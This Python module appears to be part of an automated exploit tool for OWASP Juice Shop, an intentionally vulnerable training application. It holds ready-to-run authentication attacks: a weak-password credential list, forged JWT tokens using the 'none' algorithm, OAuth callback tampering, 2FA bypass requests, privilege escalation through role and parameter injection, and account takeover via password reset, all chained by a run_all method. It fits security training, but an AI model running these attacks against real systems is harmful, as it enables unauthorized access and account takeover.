import logging
import time
import hashlib
import base64
from typing import Dict, List, Any, Optional
from selenium.webdriver.common.by import By
from core.api_client import JuiceShopAPI
from core.browser_automation import BrowserAutomation


class AuthenticationBypassExploits:
    """
    Authentication Bypass Exploits fÃ¼r OWASP Juice Shop
    """
    
    def __init__(self, api: JuiceShopAPI, browser: Optional[BrowserAutomation] = None):
        self.api = api
        self.browser = browser
        self.logger = logging.getLogger(__name__)
        
    def exploit_weak_passwords(self) -> Dict[str, Any]:
        """
        Challenge: Login with Weak Passwords
        """
        self.logger.info("Exploiting: Weak Password Login")
        
        # Common weak passwords for juice shop users
        weak_credentials = [
            {"email": "admin@juice-sh.op", "password": "admin123"},
            {"email": "admin@juice-sh.op", "password": "admin"},
            {"email": "admin@juice-sh.op", "password": "password"},
            {"email": "admin@juice-sh.op", "password": "123456"},
            {"email": "jim@juice-sh.op", "password": "ncc-1701"},  # Star Trek reference
            {"email": "bender@juice-sh.op", "password": "bender"},
            {"email": "bender@juice-sh.op", "password": "bite my shiny metal ass"},
            {"email": "amy@juice-sh.op", "password": "K1f..."},
            {"email": "admin@juice-sh.op", "password": "0192023a7bbd73250516f069df18b500"},  # MD5 hash
        ]
        
        successful_logins = []
        
        for creds in weak_credentials:
            try:
                result = self.api.login(creds['email'], creds['password'])
                if 'authentication' in result:
                    self.logger.info(f"Weak password login: {creds['email']}:{creds['password']}")
                    successful_logins.append({
                        'email': creds['email'],
                        'password': creds['password'],
                        'result': result
                    })
                    
            except Exception as e:
                self.logger.debug(f"Login failed for {creds['email']}")
                
        if successful_logins:
            return {
                'success': True,
                'challenge': 'Weak Password Login',
                'successful_logins': successful_logins
            }
            
        return {'success': False, 'challenge': 'Weak Password Login'}
        
    def exploit_password_reset_manipulation(self) -> Dict[str, Any]:
        """
        Challenge: Password Reset Token Manipulation
        """
        self.logger.info("Exploiting: Password Reset Token Manipulation")
        
        if not self.browser:
            self.logger.warning("Browser required for password reset")
            return {'success': False, 'challenge': 'Password Reset', 'error': 'Browser required'}
            
        try:
            # Navigate to forgot password
            self.browser.navigate(f"{self.api.base_url}/#/forgot-password")
            time.sleep(2)
            
            # Submit password reset for known user
            email_input = self.browser.wait_for_element(By.CSS_SELECTOR, "input[type='email']")
            self.browser.type_text(email_input, "jim@juice-sh.op")
            
            submit_button = self.browser.wait_for_clickable(By.CSS_SELECTOR, "button[type='submit']")
            self.browser.click(submit_button)
            
            # Look for reset token in response or URL
            time.sleep(2)
            current_url = self.browser.get_current_url()
            page_source = self.browser.get_page_source()
            
            # Try to extract reset token from various sources
            if 'token=' in current_url or 'reset' in current_url:
                self.logger.info("Password reset token found in URL")
                return {
                    'success': True,
                    'challenge': 'Password Reset Manipulation',
                    'url': current_url
                }
                
            # Check if token is exposed in page source
            if 'token' in page_source.lower():
                self.logger.info("Password reset token found in page source")
                return {
                    'success': True,
                    'challenge': 'Password Reset Manipulation',
                    'source': 'Page source contains token'
                }
                
        except Exception as e:
            self.logger.error(f"Password reset exploitation failed: {e}")
            
        return {'success': False, 'challenge': 'Password Reset Manipulation'}
        
    def exploit_session_management(self) -> Dict[str, Any]:
        """
        Challenge: Broken Session Management
        """
        self.logger.info("Exploiting: Broken Session Management")
        
        # Test session fixation and hijacking
        try:
            # First, login with valid credentials
            login_result = self.api.login("admin@juice-sh.op", "admin123")
            if 'authentication' not in login_result:
                return {'success': False, 'challenge': 'Session Management', 'error': 'Initial login failed'}
                
            original_token = login_result['authentication']['token']
            
            # Test if we can manipulate the session
            # Try accessing resources without proper authentication
            self.api.auth_token = None
            
            # Attempt to access admin resources without token
            try:
                users = self.api.get_users()
                if users and 'data' in users:
                    self.logger.info("Accessed admin resources without authentication")
                    return {
                        'success': True,
                        'challenge': 'Session Management',
                        'issue': 'Admin resources accessible without authentication'
                    }
            except:
                pass
                
            # Test weak session tokens
            weak_tokens = [
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoxLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIn19.",
                "admin123",
                "session123",
                base64.b64encode(b'{"id":1,"email":"admin@juice-sh.op"}').decode()
            ]
            
            for token in weak_tokens:
                self.api.auth_token = token
                try:
                    whoami = self.api.whoami()
                    if 'user' in whoami:
                        self.logger.info(f"Weak session token accepted: {token}")
                        return {
                            'success': True,
                            'challenge': 'Session Management',
                            'weak_token': token
                        }
                except:
                    pass
                    
            # Restore original token
            self.api.auth_token = original_token
            
        except Exception as e:
            self.logger.error(f"Session management exploit failed: {e}")
            
        return {'success': False, 'challenge': 'Session Management'}
        
    def exploit_oauth_bypass(self) -> Dict[str, Any]:
        """
        Challenge: OAuth Bypass
        """
        self.logger.info("Exploiting: OAuth Bypass")
        
        if not self.browser:
            self.logger.warning("Browser required for OAuth bypass")
            return {'success': False, 'challenge': 'OAuth Bypass', 'error': 'Browser required'}
            
        try:
            # Navigate to OAuth login if available
            self.browser.navigate(f"{self.api.base_url}/#/login")
            time.sleep(2)
            
            # Look for OAuth login buttons
            oauth_buttons = self.browser.find_elements(By.CSS_SELECTOR, "button[aria-label*='Google']")
            if not oauth_buttons:
                oauth_buttons = self.browser.find_elements(By.CSS_SELECTOR, "a[href*='oauth']")
                
            if oauth_buttons:
                # Try to manipulate OAuth flow
                oauth_url = self.browser.get_current_url()
                
                # Try direct manipulation of OAuth callback
                callback_payloads = [
                    f"{self.api.base_url}/rest/user/oauth/callback?code=admin&state=bypass",
                    f"{self.api.base_url}/rest/user/oauth/callback?access_token=admin123",
                    f"{self.api.base_url}/rest/user/oauth/callback?user=admin@juice-sh.op"
                ]
                
                for payload in callback_payloads:
                    try:
                        self.browser.navigate(payload)
                        time.sleep(1)
                        
                        if "dashboard" in self.browser.get_current_url() or "profile" in self.browser.get_current_url():
                            self.logger.info(f"OAuth bypass successful: {payload}")
                            return {
                                'success': True,
                                'challenge': 'OAuth Bypass',
                                'payload': payload
                            }
                    except:
                        pass
                        
        except Exception as e:
            self.logger.error(f"OAuth bypass failed: {e}")
            
        return {'success': False, 'challenge': 'OAuth Bypass'}
        
    def exploit_2fa_bypass(self) -> Dict[str, Any]:
        """
        Challenge: 2FA Bypass
        """
        self.logger.info("Exploiting: 2FA Bypass")
        
        # Common 2FA bypass techniques
        bypass_methods = [
            # Direct endpoint access
            {"method": "direct_access", "endpoint": "/rest/user/2fa/verify", "payload": {"token": "000000"}},
            {"method": "direct_access", "endpoint": "/rest/user/2fa/verify", "payload": {"token": "123456"}},
            
            # Parameter manipulation
            {"method": "param_manipulation", "endpoint": "/rest/user/2fa/setup", "payload": {"enabled": False}},
            
            # Session manipulation
            {"method": "session_manipulation", "endpoint": "/rest/user/whoami", "payload": {"bypass_2fa": True}}
        ]
        
        for method in bypass_methods:
            try:
                response = self.api._make_request(
                    'POST',
                    method['endpoint'],
                    json=method['payload']
                )
                
                if response.status_code == 200:
                    result = response.json()
                    if 'success' in result or 'authentication' in result:
                        self.logger.info(f"2FA bypass successful: {method['method']}")
                        return {
                            'success': True,
                            'challenge': '2FA Bypass',
                            'method': method['method'],
                            'payload': method['payload']
                        }
                        
            except Exception as e:
                self.logger.debug(f"2FA bypass method failed: {method['method']}")
                
        return {'success': False, 'challenge': '2FA Bypass'}
        
    def exploit_privilege_escalation(self) -> Dict[str, Any]:
        """
        Challenge: Privilege Escalation
        """
        self.logger.info("Exploiting: Privilege Escalation")
        
        try:
            # Login as regular user first
            login_result = self.api.login("jim@juice-sh.op", "ncc-1701")
            if 'authentication' not in login_result:
                # Try with different credentials
                login_result = self.api.login("test@test.com", "test123")
                
            if 'authentication' in login_result:
                # Try to escalate privileges
                escalation_payloads = [
                    # Direct role manipulation
                    {"role": "admin", "isAdmin": True},
                    {"user_type": "administrator"},
                    {"permissions": ["admin", "read", "write", "delete"]},
                    
                    # Parameter pollution
                    {"id": [1, 1], "role": ["user", "admin"]},
                    
                    # HTTP Parameter Pollution
                    {"role": "user&role=admin"}
                ]
                
                for payload in escalation_payloads:
                    try:
                        # Try to update user profile with admin privileges
                        response = self.api._make_request(
                            'PUT',
                            f"/api/Users/{self.api.user_id}",
                            json=payload
                        )
                        
                        # Check if escalation worked
                        whoami = self.api.whoami()
                        if 'user' in whoami and ('admin' in str(whoami).lower() or 'administrator' in str(whoami).lower()):
                            self.logger.info("Privilege escalation successful")
                            return {
                                'success': True,
                                'challenge': 'Privilege Escalation',
                                'payload': payload,
                                'result': whoami
                            }
                            
                    except Exception as e:
                        self.logger.debug(f"Privilege escalation payload failed: {payload}")
                        
        except Exception as e:
            self.logger.error(f"Privilege escalation failed: {e}")
            
        return {'success': False, 'challenge': 'Privilege Escalation'}
        
    def exploit_account_takeover(self) -> Dict[str, Any]:
        """
        Challenge: Account Takeover
        """
        self.logger.info("Exploiting: Account Takeover")
        
        # Try various account takeover methods
        takeover_methods = [
            # Email manipulation
            {"email": "admin@juice-sh.op", "newEmail": "hacker@evil.com"},
            
            # Password change without current password
            {"newPassword": "hacked123", "confirmPassword": "hacked123"},
            
            # Security question manipulation
            {"securityAnswer": "hacked", "newPassword": "hacked123"}
        ]
        
        try:
            # First, we need to target a known user
            target_users = ["admin@juice-sh.op", "jim@juice-sh.op", "bender@juice-sh.op"]
            
            for target in target_users:
                for method in takeover_methods:
                    try:
                        # Try password reset manipulation
                        if 'newPassword' in method:
                            response = self.api._make_request(
                                'POST',
                                '/rest/user/reset-password',
                                json={
                                    "email": target,
                                    **method
                                }
                            )
                            
                            if response.status_code == 200:
                                # Try to login with new password
                                login_result = self.api.login(target, method['newPassword'])
                                if 'authentication' in login_result:
                                    self.logger.info(f"Account takeover successful for {target}")
                                    return {
                                        'success': True,
                                        'challenge': 'Account Takeover',
                                        'target': target,
                                        'method': method
                                    }
                                    
                    except Exception as e:
                        self.logger.debug(f"Account takeover attempt failed for {target}")
                        
        except Exception as e:
            self.logger.error(f"Account takeover failed: {e}")
            
        return {'success': False, 'challenge': 'Account Takeover'}
        
    def run_all(self) -> List[Dict[str, Any]]:
        """FÃ¼hrt alle Authentication Bypass Exploits aus"""
        exploits = [
            self.exploit_weak_passwords,
            self.exploit_session_management,
            self.exploit_2fa_bypass,
            self.exploit_privilege_escalation,
            self.exploit_account_takeover
        ]
        
        if self.browser:
            exploits.extend([
                self.exploit_password_reset_manipulation,
                self.exploit_oauth_bypass
            ])
            
        results = []
        for exploit in exploits:
            try:
                result = exploit()
                results.append(result)
                time.sleep(1)
            except Exception as e:
                self.logger.error(f"Authentication exploit failed: {e}")
                results.append({
                    'success': False,
                    'error': str(e),
                    'exploit': exploit.__name__
                })
                
        return results